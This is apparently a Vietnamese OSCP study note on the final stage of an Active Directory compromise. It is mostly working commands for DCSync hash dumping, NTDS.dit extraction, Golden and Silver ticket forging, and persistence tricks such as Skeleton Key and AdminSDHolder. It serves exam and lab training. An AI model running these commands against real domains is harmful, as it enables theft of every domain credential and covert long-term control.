# 08 — Domain Admin: DCSync, NTDS.dit & Persistence

Khi đã có quyền tương đương Domain Admin (hoặc quyền replication), mục tiêu cuối:
**lấy toàn bộ hash của domain** (đặc biệt `krbtgt`) để chứng minh chiếm domain và
tạo persistence. Trong OSCP, lấy được hash của `Administrator` domain / dump
`NTDS.dit` thường là điều kiện "đã chiếm domain".

> Persistence (Golden ticket, DSRM…) chủ yếu để **hiểu** và cho pentest thật.
> Trong thi, một khi đã DA, hãy tập trung lấy flag/`proof.txt` trên DC.

---

## 1. DCSync — lấy hash mà không cần lên DC

**Giải thích:** DCSync giả làm một Domain Controller và yêu cầu DC thật
"replicate" dữ liệu secret (gọi RPC `DRSGetNCChanges`). Cần quyền
**DS-Replication-Get-Changes** + **-Get-Changes-All** (Domain Admins, DC, hoặc
user bị gán nhầm — edge *DCSync* trong BloodHound).

```bash
# Lấy riêng krbtgt (để làm Golden ticket) hoặc Administrator
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user krbtgt
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc-user Administrator
# Toàn bộ domain (NTLM + Kerberos keys + cleartext nếu reversible)
impacket-secretsdump $DOMAIN/$USER:$PASS@$DC -just-dc
impacket-secretsdump -hashes :$HASH $DOMAIN/$USER@$DC -just-dc-ntlm

nxc smb $DC -u $USER -p $PASS --ntds                 # NetExec DCSync
nxc smb $DC -u $USER -H $HASH --ntds
```

```powershell
PS> mimikatz # lsadump::dcsync /domain:corp.local /user:corp\krbtgt
PS> mimikatz # lsadump::dcsync /domain:corp.local /user:corp\Administrator
```

Output: `Administrator:500:aad3b...:<nthash>:::` → PtH thành DA ngay.

### Tự gán quyền DCSync (khi có WriteDacl trên domain object)

```bash
impacket-dacledit -action write -rights DCSync -principal $USER -target-dn "DC=corp,DC=local" "$DOMAIN/$USER:$PASS" -dc-ip $DC
bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS add dcsync $USER
```

**Lab:** HTB *Forest*/*Blackfield* (qua Exchange/ACL → DCSync), HTB *Cascade*
(nhóm có quyền), hầu hết chain kết thúc bằng DCSync.

---

## 2. Dump NTDS.dit trực tiếp trên DC

Khi có shell admin/SYSTEM trên DC nhưng muốn copy cơ sở dữ liệu AD (`NTDS.dit`).

```powershell
# Dùng VSS snapshot (NTDS.dit đang bị khóa)
PS> ntdsutil "ac i ntds" "ifm" "create full C:\temp\ifm" q q
# hoặc vssadmin:
PS> vssadmin create shadow /for=C:
PS> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyX\Windows\NTDS\NTDS.dit C:\temp\
PS> reg save HKLM\SYSTEM C:\temp\system.save
```

```bash
# Secretsdump offline
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
# Từ xa qua NetExec (tự VSS):
nxc smb $DC -u $USER -p $PASS -M ntdsutil
```

**Backup Operators** (không phải DA) cũng dump được NTDS.dit nhờ `SeBackup` —
xem [file 04 §3](04-leo-thang-acl-delegation.md).

---

## 3. Golden Ticket

**Giải thích:** Có NT hash (hoặc AES key) của `krbtgt` → tự ký **TGT** cho bất kỳ
user nào, thuộc nhóm bất kỳ (kể cả Domain Admins), hợp lệ tới khi `krbtgt` đổi
mật khẩu 2 lần. Persistence mạnh nhất.

```bash
# Cần: krbtgt hash + Domain SID
impacket-lookupsid $DOMAIN/$USER:$PASS@$DC | grep "Domain SID"
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain $DOMAIN Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass $DC_FQDN
```

```powershell
PS> mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /krbtgt:<hash> /ptt
```

---

## 4. Silver Ticket

**Giải thích:** Có hash của **tài khoản service** (hoặc máy) → tự ký **TGS** cho
một service cụ thể (CIFS, MSSQL, HTTP, HOST…) trên máy chạy service đó → truy cập
service với danh tính bất kỳ, **không chạm DC** (kín hơn Golden).

```bash
impacket-ticketer -nthash <service_hash> -domain-sid S-1-5-21-... -domain $DOMAIN \
  -spn MSSQLSvc/sql01.corp.local:1433 Administrator
export KRB5CCNAME=Administrator.ccache
impacket-mssqlclient -k -no-pass sql01.corp.local
```

**Lab:** PG *Nagoya* (Silver ticket MSSQL), HTB *Scrambled*.

---

## 5. Persistence khác (tham khảo)

| Kỹ thuật | Ý tưởng |
|----------|---------|
| **Diamond/Sapphire Ticket** | Sửa TGT thật thay vì tạo mới → khó phát hiện hơn Golden |
| **Skeleton Key** | `mimikatz # misc::skeleton` → mật khẩu phụ `mimikatz` cho mọi user (chỉ trong RAM DC) |
| **DSRM** | Dùng hash DSRM admin local của DC để đăng nhập DC |
| **AdminSDHolder** | Ghi ACE vào object AdminSDHolder → SDProp áp lại quyền mỗi 60' lên nhóm admin |
| **Custom SSP** | Nạp `mimilib`/`memssp` → ghi mật khẩu cleartext mọi lần đăng nhập |
| **Golden gMSA / certificate (DPAPI domain backup key)** | Persistence cấp forest |

```powershell
# AdminSDHolder ví dụ
PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' -PrincipalIdentity alice -Rights All
```

---

## 6. Sau khi chiếm domain — làm gì trong thi

1. `impacket-secretsdump -just-dc` lưu toàn bộ hash (dùng cho các máy khác / báo cáo).
2. Lấy `proof.txt`/flag trên DC (thường `C:\Users\Administrator\Desktop\`).
3. Kiểm tra **trust** sang domain/forest khác ([file 09](09-trust.md)) nếu đề còn máy.
4. Dùng hash DA để PtH các máy chưa chiếm (lateral — file 07) lấy nốt proof.

## Checklist

- [ ] DCSync `krbtgt` + `Administrator` + `-just-dc`
- [ ] PtH Administrator → DC → proof.txt
- [ ] (Nếu cần) NTDS.dit offline
- [ ] Hash DA → quét lại toàn mạng, lấy mọi proof còn thiếu
- [ ] Kiểm tra trust nếu còn domain khác
